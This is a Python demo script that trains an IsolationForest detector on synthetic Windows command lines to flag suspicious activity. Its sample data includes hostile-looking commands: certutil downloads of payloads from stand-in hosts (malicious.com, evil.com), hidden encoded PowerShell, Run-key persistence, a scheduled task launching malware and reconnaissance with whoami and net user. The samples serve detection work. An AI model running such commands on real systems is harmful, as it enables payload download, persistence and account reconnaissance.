# save as: portfolio_ai_demo.py
import pandas as pd
import numpy as np
from datetime import datetime, timedelta
import random
import joblib

# Generate more diverse training data
def generate_training_data():
    """Generate realistic command line data for training"""
    
    normal_commands = [
        "C:\\Windows\\System32\\notepad.exe",
        "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE",
        "C:\\Windows\\explorer.exe",
        "C:\\Windows\\System32\\taskmgr.exe",
        "C:\\Windows\\System32\\mmc.exe",
        "C:\\Windows\\System32\\services.msc",
        "chrome.exe https://www.google.com",
        "C:\\Windows\\System32\\SystemPropertiesAdvanced.exe"
    ]
    
    suspicious_commands = [
        "powershell.exe -enc SGVsbG8gV29ybGQ=",
        "powershell.exe -executionpolicy bypass -windowstyle hidden",
        "cmd.exe /c whoami && net user && net group",
        "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"",
        "certutil.exe -urlcache -split -f http://malicious.com/payload.exe",
        "wmic process call create \"powershell.exe -nop -w hidden\"",
        "reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "schtasks.exe /create /tn \"Updater\" /tr \"C:\\temp\\malware.exe\""
    ]
    
    data = []
    base_time = datetime.now() - timedelta(days=7)
    
    # Generate normal activity (80%)
    for i in range(80):
        time = base_time + timedelta(hours=random.randint(8, 17), minutes=random.randint(0, 59))
        data.append({
            'timestamp': time,
            'command_line': random.choice(normal_commands),
            'hostname': 'DESKTOP-NORMAL',
            'label': 'normal'
        })
    
    # Generate suspicious activity (20%)
    for i in range(20):
        # Suspicious often happens after hours
        hour = random.choice([2, 3, 4, 22, 23])
        time = base_time + timedelta(days=random.randint(0, 6), hours=hour, minutes=random.randint(0, 59))
        data.append({
            'timestamp': time,
            'command_line': random.choice(suspicious_commands),
            'hostname': 'DESKTOP-SUSPECT',
            'label': 'suspicious'
        })
    
    return pd.DataFrame(data)

# Create enhanced AI detector
class EnhancedAIDetector:
    def __init__(self):
        self.model = None
        self.threshold = -0.45  # Adjusted threshold
        
    def extract_advanced_features(self, df):
        """Extract more sophisticated features"""
        features = pd.DataFrame()
        
        # Length features
        features['cmd_length'] = df['command_line'].str.len()
        features['long_command'] = (features['cmd_length'] > 100).astype(int)
        
        # Suspicious patterns
        features['has_encoding'] = df['command_line'].str.contains('-enc|-nop|-w hidden', case=False, regex=True).astype(int)
        features['has_download'] = df['command_line'].str.contains('urlcache|wget|curl|download', case=False, regex=True).astype(int)
        features['has_registry'] = df['command_line'].str.contains('reg.exe|regedit|HKLM|HKCU', case=False, regex=True).astype(int)
        features['has_schedule'] = df['command_line'].str.contains('schtasks|at.exe', case=False, regex=True).astype(int)
        features['has_wmic'] = df['command_line'].str.contains('wmic', case=False).astype(int)
        features['has_certutil'] = df['command_line'].str.contains('certutil', case=False).astype(int)
        
        # Time-based
        df['hour'] = pd.to_datetime(df['timestamp']).dt.hour
        features['after_hours'] = ((df['hour'] < 6) | (df['hour'] > 20)).astype(int)
        features['weekend'] = (pd.to_datetime(df['timestamp']).dt.dayofweek >= 5).astype(int)
        
        # Command chaining
        features['command_chain'] = df['command_line'].str.contains('&&|;|\\|', regex=True).astype(int)
        
        return features
    
    def train(self, df):
        from sklearn.ensemble import IsolationForest
        
        features = self.extract_advanced_features(df)
        self.model = IsolationForest(
            contamination=0.2,  # Expect 20% anomalies
            random_state=42,
            n_estimators=200
        )
        self.model.fit(features)
        
        # Save for portfolio
        joblib.dump(self.model, 'enhanced_ai_model.pkl')
        joblib.dump(self.threshold, 'detection_threshold.pkl')
        
        return self
    
    def detect(self, command_line, timestamp=None):
        """Real-time detection for portfolio demo"""
        if timestamp is None:
            timestamp = datetime.now()
            
        df = pd.DataFrame([{
            'command_line': command_line,
            'timestamp': timestamp
        }])
        
        features = self.extract_advanced_features(df)
        score = self.model.score_samples(features)[0]
        
        is_suspicious = score < self.threshold
        
        return {
            'command': command_line,
            'timestamp': timestamp,
            'anomaly_score': score,
            'is_suspicious': is_suspicious,
            'confidence': abs(score - self.threshold) * 100,
            'risk_level': 'HIGH' if score < -0.5 else 'MEDIUM' if score < -0.4 else 'LOW'
        }

# Portfolio demonstration
if __name__ == "__main__":
    print("🚀 AI-Powered SOC Detection System - Portfolio Demo")
    print("=" * 60)
    
    # Generate training data
    print("📊 Generating diverse training dataset...")
    train_df = generate_training_data()
    train_df.to_csv('enhanced_training_data.csv', index=False)
    print(f"✅ Generated {len(train_df)} samples (80% normal, 20% suspicious)")
    
    # Train enhanced model
    print("\n🤖 Training Enhanced AI Model...")
    detector = EnhancedAIDetector()
    detector.train(train_df)
    print("✅ Model trained with advanced features")
    
    # Demo detections
    print("\n🔍 Real-Time Detection Demo:")
    print("-" * 60)
    
    test_cases = [
        ("notepad.exe C:\\Users\\Documents\\report.txt", "10:30"),
        ("powershell.exe -enc U3RhcnQtUHJvY2Vzcw==", "03:15"),
        ("cmd.exe /c whoami && net user administrator", "22:45"),
        ("chrome.exe https://gmail.com", "14:20"),
        ("certutil.exe -urlcache -f http://evil.com/payload.exe", "02:30"),
        ("C:\\Program Files\\Microsoft Office\\EXCEL.EXE", "09:15")
    ]
    
    for cmd, time_str in test_cases:
        hour, minute = map(int, time_str.split(':'))
        timestamp = datetime.now().replace(hour=hour, minute=minute)
        
        result = detector.detect(cmd, timestamp)
        
        status = "🚨 SUSPICIOUS" if result['is_suspicious'] else "✅ NORMAL"
        print(f"\n{status}")
        print(f"Command: {result['command'][:60]}...")
        print(f"Time: {time_str} | Risk: {result['risk_level']} | Confidence: {result['confidence']:.1f}%")
        print(f"Anomaly Score: {result['anomaly_score']:.3f}")
